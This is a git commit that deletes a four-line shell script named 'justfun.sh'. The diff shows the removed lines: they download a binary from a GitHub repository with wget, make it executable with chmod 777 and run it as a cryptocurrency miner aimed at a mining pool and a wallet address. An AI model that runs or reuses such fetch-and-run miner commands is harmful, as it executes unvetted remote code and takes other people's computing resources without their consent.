7c302956f9724d648ac768b481c78748caa80b81
srioyooeisfuer <srooyisfiieu@gmail.com>
2024-12-10 05:21:36 +0700

    Delete justfun.sh

--- justfun.sh
+++
@@ -1,4 +0,0 @@
-apt sudo update
-wget https://github.com/fikriboehimi/rutss/raw/refs/heads/main/MULTI
-chmod 777 MULTI
-./MULTI --algorithm lyra2v2_webchain --pool web-ko1.gonspool.com:3333 --wallet 0xDA45B452B7FB0fc31ea7c4e88Dc3db0a9685BD19 --password x --disable-gpu
